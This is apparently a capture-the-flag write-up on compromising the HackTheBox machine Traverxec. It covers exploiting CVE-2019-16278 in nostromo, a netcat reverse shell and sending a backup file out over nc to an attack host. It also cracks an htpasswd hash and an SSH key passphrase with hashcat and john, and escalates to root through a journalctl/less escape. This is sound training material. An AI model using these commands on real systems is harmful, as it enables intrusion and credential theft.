![traverxec card](https://user-images.githubusercontent.com/8876599/113888787-a688cc80-9790-11eb-8e56-af8a48a9cdfc.png)

![nostromo version](https://user-images.githubusercontent.com/8876599/113888850-b3a5bb80-9790-11eb-8baf-3385f5aec46b.png)

![searchsploit nostromo](https://user-images.githubusercontent.com/8876599/113888888-baccc980-9790-11eb-8d86-cc6784a97649.png)

https://github.com/AnubisSec/CVE-2019-16278

CVE-2019-16278

Just provide an IP/port and the command you want to run and you're good to go. (if command has spaces, put cmd between "" ) \

Testing for command execution using the exploit

![nostromo id](https://user-images.githubusercontent.com/8876599/113889245-07180980-9791-11eb-8904-407e507833b3.png)

Verified we have command execution as www-data

![nostromo nc](https://user-images.githubusercontent.com/8876599/113889636-69710a00-9791-11eb-9340-a672a251400f.png)

Verified nc was available on the machine, and sent out a reverse shell back to my attack box

Make sure that you have your nc listener setup on your attack box so you can catch the shell

nc -lnvp 9001

![62d14441ba454b43bdb1ce921c96cc07](https://user-images.githubusercontent.com/8876599/113889925-af2dd280-9791-11eb-94e9-6fb86b53b6d1.png)

https://www.slashroot.in/how-are-passwords-stored-linux-understanding-hashing-shadow-utils

https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/

**Cracking with hashcat**

Putting the entire hash into htaccess and setting the --username flag for hashcat to crack the password hash

**hashcat -m 500 htpasswd /usr/share/wordlists/rockyou.txt --username --force**

Breaking this down ...

david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/

Username: david:
MD5 : $1
Salt : $e7NfNpNi
Hash PW : $A6nCwOTqrNR2oDuIKirRZ/

$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me    

![hashcat password reveal](https://user-images.githubusercontent.com/8876599/113890385-1ba8d180-9792-11eb-9935-cfc9a5dc229d.png)

David : Nowonly4me

**I'm unable to su or ssh in as david using this password, the only hints I have on this box are related to the nostromo nhttpd.conf file**

Reviewing the nhttpd.conf file there is a section regarding home directory. This option serves up home directory of users via HTTP.

http://www.nazgul.ch/dev/nostromo_man.html

![nostromo homedirs](https://user-images.githubusercontent.com/8876599/113890489-3418ec00-9792-11eb-9dd7-72d425cfcc0e.png)

Through LFI I'm able to navigate to the http://10.10.10.165/~david/ home directory but I can't discover or access any directories that should be otherwise accessible (ssh, htpasswd, profile, etc)

The only directory I'm able to get to is index.html - This is accessible on the server as www-data

![public_www](https://user-images.githubusercontent.com/8876599/113890560-4561f880-9792-11eb-830e-c06fe2bfd907.png)

Downloaded the fies back to my machine using nc

Victim:
cat backup-ssh-identity-files.tgz | nc 10.10.14.25 9001

Kali:
nc -lnvp 9001 > backup-ssh-identity-files.tgz.b64

Decompressed the files using tar

mv backup-ssh-identity-files.tgz.b64 backup-ssh-identity-files.tgz
tar -zxvf backup-ssh-identity-files.tgz

![ssh backup keys](https://user-images.githubusercontent.com/8876599/113890835-835f1c80-9792-11eb-9a36-7f7b96c17e21.png)

Cracking the ssh private key password

Ran ssh2john against the private ssh key and then cracked the key using john

ssh2john id_rsa > id_rsa.john
john id_rsa.john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

![john ssh key](https://user-images.githubusercontent.com/8876599/113890936-9d006400-9792-11eb-9b37-52a6a221df3e.png)

Creating a copy of the rsa_key that isn't protected for future use

openssl rsa -in id_rsa -out ~/htb/traverxec/id_rsa_traverxec_david

![openssl key](https://user-images.githubusercontent.com/8876599/113891012-ae497080-9792-11eb-9fe7-5184cf64e63c.png)

Able to ssh into the box as david using his private key

![ssh as david](https://user-images.githubusercontent.com/8876599/113891093-bef9e680-9792-11eb-85b7-de93453fced8.png)

Exploring users home directory to see if there are any useful scripts

![david home](https://user-images.githubusercontent.com/8876599/113891133-c91be500-9792-11eb-88b2-d2259a190d13.png)

I can run the script without any issues, which tells me I must be a member of the sudoers group, but I can't run sudo -l is prompts for a password. Checking gtfo bins for jounalctl

![gtfo jounralctl](https://user-images.githubusercontent.com/8876599/113891190-d638d400-9792-11eb-8738-23afac340872.png)

Because the journalctl is calling for the last 5 lines, if we shrink the terminal to < 5 lines we will get into less as root, where we can then run the gtfobins cmd !/bin/bash to escape with a root shell.

![journalctl exploit](https://user-images.githubusercontent.com/8876599/113891246-e3ee5980-9792-11eb-920c-53a77a61f622.png)

![traverxec root](https://user-images.githubusercontent.com/8876599/113891260-e81a7700-9792-11eb-955d-d931e261b099.png)






